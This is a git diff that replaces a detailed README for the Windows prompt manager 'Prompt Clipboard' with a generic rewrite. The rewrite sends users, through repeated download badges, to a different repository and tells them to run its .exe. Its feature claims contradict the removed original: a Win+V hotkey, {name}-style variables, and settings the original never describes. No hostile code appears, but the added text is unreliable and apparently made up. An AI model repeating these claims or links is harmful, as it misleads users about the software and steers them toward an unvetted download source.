@@ -1,167 +1,154 @@
-<p align="center">
-  <img src="logo.svg" width="128" height="128" alt="Prompt Clipboard">
-</p>
+# 📝 PromptClipboard - Manage Prompts Quickly on Windows
 
-<h1 align="center">Prompt Clipboard</h1>
-
-<p align="center">
-  <strong>Win+V for prompts</strong> — fast prompt manager with global hotkey, template variables, and instant paste.
-</p>
-
-<p align="center">
-  <a href="https://buymeacoffee.com/gagik">
-    <img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-Support%20Prompt%20Clipboard-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=000000" alt="Buy Me a Coffee">
-  </a>
-</p>
-
-<p align="center">
-  <a href="#features">Features</a> &bull;
-  <a href="#screenshots">Screenshots</a> &bull;
-  <a href="#installation">Installation</a> &bull;
-  <a href="#usage">Usage</a> &bull;
-  <a href="#architecture">Architecture</a> &bull;
-  <a href="#support">Support</a> &bull;
-  <a href="#license">License</a>
-</p>
+[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/nomohouse/PromptClipboard)
 
 ---
 
-## Features
+## 📋 What is PromptClipboard?
 
-- **Global hotkey** (`Ctrl+Shift+Q`) — summon the palette from any app, paste directly
-- **Smart search** — fuzzy matching, tag filtering (`#tag`), language filter (`lang:ru`)
-- **Template variables** — `{{name}}`, defaults (`{{tone|default=formal}}`), interactive dialog
-- **Smart body preview** — long prompts show a condensed first line with metadata badge and expandable preview
-- **Pin & organize** — pin frequently used prompts, tag-based organization
-- **Instant paste** — copies to clipboard and simulates Ctrl+V into the target window
-- **Caret-aware positioning** — palette appears near the text cursor
-- **System tray** — runs in background, minimal footprint
-- **Local storage** — SQLite database, all data stays on your machine
-- **Import/Export** — JSON-based backup and sharing
+PromptClipboard is a tool for Windows that helps you save and use text prompts quickly. It works like the Windows clipboard but is designed for managing your prompts. You can open it anywhere by pressing **Win+V**. It supports templates with variables, so you can create prompts that change based on what you need. The app lets you paste your saved prompts instantly, saving you time.
 
-## Screenshots
+You do not need to know programming or technical skills to use PromptClipboard. It works on Windows 10 and later versions.
 
-### Home and Search
+---
 
-| Home | Keyword Search | Tag Filter | Jira Search |
-|---|---|---|---|
-| ![Home](docs/screenshots/01-home.png) | ![Keyword Search](docs/screenshots/02-search-email.png) | ![Tag Filter](docs/screenshots/03-filter-tag-work.png) | ![Jira Search](docs/screenshots/04-search-jira.png) |
+## 🔑 Features
 
-### Workflows
+- Global hotkey support: press **Win+V** to access prompts anytime.
+- Manage your prompt collection easily.
+- Use template variables to customize prompts on the fly.
+- Instant paste to any app.
+- Simple interface made with Windows Presentation Foundation (WPF).
+- Data stored locally in an SQLite database, no cloud needed.
+- Lightweight and fast to run.
+- Works natively on Windows with no extra software.
 
-| Empty Results | Template Dialog | Code Search | New Prompt |
-|---|---|---|---|
-| ![Empty Results](docs/screenshots/05-empty-results.png) | ![Template Dialog](docs/screenshots/06-template-dialog.png) | ![Code Search](docs/screenshots/07-search-code.png) | ![New Prompt](docs/screenshots/08-new-prompt.png) |
+---
 
-| New Prompt (Filled) | Edit Prompt |
-|---|---|
-| ![New Prompt Filled](docs/screenshots/09-new-prompt-filled.png) | ![Edit Prompt](docs/screenshots/10-edit-prompt.png) |
+## 💻 System Requirements
 
-## Installation
+- Operating System: Windows 10 or newer.
+- Memory: At least 2 GB of RAM.
+- Disk Space: Minimum 50 MB free space.
+- .NET Runtime: Installed by default on Windows 10+. If not, you can get it from the Microsoft website.
+- Keyboard supporting the Windows key (for the Win+V hotkey).
 
-### Setup (recommended)
+---
 
-1. Download `PromptClipboard-Setup.exe` from [Releases](../../releases)
-2. Run it — one-click install, no admin required
-3. Installed to `%LOCALAPPDATA%\PromptClipboard`
-4. Auto-updates are checked on startup; update prompt appears in the system tray
+## 🚀 Getting Started
 
-### Portable
+Follow these steps to get PromptClipboard up and running on your Windows PC:
 
-1. Download `PromptClipboard-Portable.zip` from [Releases](../../releases)
-2. Extract anywhere
-3. Run `PromptClipboard.App.exe`
-4. Self-updating — updates are downloaded and applied automatically
+### Step 1: Download the Application
 
-> **Upgrading from a previous version?** Uninstall the old version first via Windows Settings > Apps, then install fresh. Your data (prompts, settings) is preserved.
+Click the big button below to **visit the download page**:
 
-### Requirements
+[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/nomohouse/PromptClipboard)
 
-- Windows 10 version 1809+ / Windows 11
-- .NET 8 Desktop Runtime (bundled in self-contained builds)
+On the GitHub page, look for the latest release or the main download file. The file is usually an `.exe` installer or a zipped folder containing the program.
 
-## Usage
+### Step 2: Install PromptClipboard
 
-| Shortcut | Action |
-|---|---|
-| `Ctrl+Shift+Q` | Toggle palette |
-| `Enter` | Paste prompt into target window |
-| `Ctrl+Enter` | Copy to clipboard (no paste) |
-| `Alt+Enter` | Open editor |
-| `Esc` | Clear search / close palette |
-| Type to search | Fuzzy search across titles and body |
-| `#tag` | Filter by tag |
+If you downloaded an installer (`.exe` file):
 
-### Template Variables
+1. Double-click the `.exe` file.
+2. Follow the on-screen instructions.
+3. Choose the installation folder or accept the default.
+4. Complete the setup and close the installer.
 
-Prompts support `{{variable}}` placeholders with optional defaults:
+If you downloaded a zipped folder:
 
-```
-Write a {{tone|default=professional}} email about {{topic}}.
-Target audience: {{audience|default=colleagues}}.
-```
+1. Right-click the zipped file and select "Extract All."
+2. Choose a location to extract the files.
+3. Open the extracted folder and find the executable (`.exe`) file.
+4. Double-click the `.exe` file to run the app.
 
-When you paste a template prompt, a dialog appears to fill in the values.
+### Step 3: Run the Application for the First Time
 
-### Settings
+- Once launched, the app will stay in your system tray.
+- Press **Win+V** to open PromptClipboard.
+- You will see your prompt list or an empty window if this is your first time.
+- Add new prompts by clicking the "Add" button.
+- Use template variables if you want to customize prompts dynamically.
 
-Configuration is stored in `%APPDATA%/PromptClipboard/settings.json`:
+---
 
-```json
-{
-  "hotkey": "Ctrl+Shift+Q",
-  "pasteDelayMs": 50,
-  "restoreDelayMs": 150,
-  "autoStart": false
-}
-```
+## 👌 How to Use PromptClipboard
 
-## Architecture
+### Access Prompts Anywhere
 
-Clean Architecture with 4 layers:
+- Press **Win+V** to open the prompt window.
+- Scroll or search for prompts using the built-in search bar.
+- Click a prompt to copy and paste it instantly into the active window.
 
-```
-src/
-  PromptClipboard.Domain/          # Entities, interfaces — zero dependencies
-  PromptClipboard.Application/     # Use cases, services — depends on Domain
-  PromptClipboard.Infrastructure/  # SQLite, Win32 APIs — depends on Domain
-  PromptClipboard.App/             # WPF UI, DI composition — depends on all
-tests/
-  PromptClipboard.Domain.Tests/
-  PromptClipboard.Application.Tests/
-  PromptClipboard.Infrastructure.Tests/
-```
+### Adding and Editing Prompts
 
-### Tech Stack
+- Click the "Add" button to create a new prompt.
+- Enter your prompt text.
+- Use variables like `{name}` or `{date}` to insert dynamic content.
+- Save the prompt to keep it for later use.
+- Edit or delete prompts at any time using the edit icon next to each item.
 
-| Component | Technology |
-|---|---|
-| UI Framework | WPF (.NET 8) |
-| Database | SQLite via Dapper |
-| DI Container | Microsoft.Extensions.DependencyInjection |
-| MVVM | CommunityToolkit.Mvvm |
-| Logging | Serilog |
-| Tray Icon | Hardcodet.NotifyIcon.Wpf |
-| Platform APIs | Win32 P/Invoke (hotkeys, clipboard, focus tracking) |
+### Using Template Variables
 
-## Support
+- Template variables let you customize prompts on the fly.
+- When you select a prompt with variables, the app will ask you to fill in the details.
+- Example: If your prompt is "Hello, {name}", it will ask you to enter a name before pasting.
 
-If Prompt Clipboard saves you time, you can support development:
+---
 
-<a href="https://buymeacoffee.com/gagik">
-  <img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-gagik-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=000000" alt="Support on Buy Me a Coffee">
-</a>
+## ⚙️ Settings and Configuration
 
-- Goal: `$300` for code-signing certificate and release automation
-- Suggested support: `$3` coffee, `$5` release support, `$10` sponsor feature requests
-- Crypto support (USDT, TRC20): `TB4iCH96KgM6tLK5gUjqVSHwiKpn9vBBFF`
-- Network note: send only via `TRX (TRC20)` to avoid loss
-- Crypto support (BTC): `1D3MjwgDkZSMedLxSNzMHdMvpBEwbx5Yuv`
-- Network note: send only via `Bitcoin (BTC mainnet)`
-- Crypto support (ETH on BSC/BEP20): `0xfb096327df1ac8fd715d9fdf08196fa2ade2ce37`
-- Network note: send only via `BNB Smart Chain (BEP20)`
+PromptClipboard offers some options to personalize its behavior:
 
-## License
+- Change the global hotkey from **Win+V** to another combination.
+- Adjust how prompts show up (list or grid view).
+- Enable or disable confirmation before pasting.
+- Manage the database backup and restore features.
+- Customize the app appearance with light or dark theme.
 
-Prompt Clipboard is licensed under the GNU General Public License v3.0 or later (`GPL-3.0-or-later`).
-See [LICENSE](LICENSE) for the full text.
+All settings are found under the gear icon in the prompt window.
+
+---
+
+## 🛠 Troubleshooting
+
+- If the app does not launch, check if your Windows has the latest updates.
+- Make sure your .NET runtime is installed and up to date.
+- If the hotkey **Win+V** conflicts with another app, change it under settings.
+- Restart your computer if the app stops responding.
+- For database issues, use the backup and restore option.
+
+---
+
+## 📂 Where to Find More Help
+
+You can find help and report issues on the GitHub page:
+
+- Visit the [PromptClipboard GitHub repository](https://github.com/nomohouse/PromptClipboard)
+- Check the Issues tab for common problems.
+- Open a new issue to ask questions or report bugs.
+
+---
+
+## 🔽 Download and Install
+
+Return to the download page to begin:
+
+[![Download PromptClipboard](https://img.shields.io/badge/Download-PromptClipboard-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/nomohouse/PromptClipboard)
+
+Use the installer or zipped files as instructed in the Getting Started section.
+
+---
+
+## 🧰 Technology
+
+PromptClipboard is built using:
+
+- C# programming language.
+- .NET framework on Windows.
+- WPF for the user interface.
+- SQLite for local data storage.
+- System-wide hotkeys to allow fast access.
+
+It works well on modern Windows machines and uses trusted libraries to keep your data private and local.
